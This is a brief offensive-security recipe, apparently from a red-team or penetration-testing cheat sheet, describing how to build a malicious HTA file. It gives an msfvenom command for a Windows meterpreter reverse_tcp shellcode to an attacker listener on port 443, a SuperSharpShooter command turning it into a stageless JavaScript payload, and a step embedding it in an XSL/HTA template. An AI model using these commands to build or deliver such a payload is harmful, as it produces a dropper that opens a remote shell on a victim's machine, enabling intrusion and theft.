### XSL Transform (xsl-template.hta)

- Create shellcode using msfvenom: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f raw -o output/shell.txt`
- Convert to JS using SuperSharpShooter: `python3 SuperSharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile shell.txt --output test`
- Embed the JS content inside the xsl-template.hta template file.
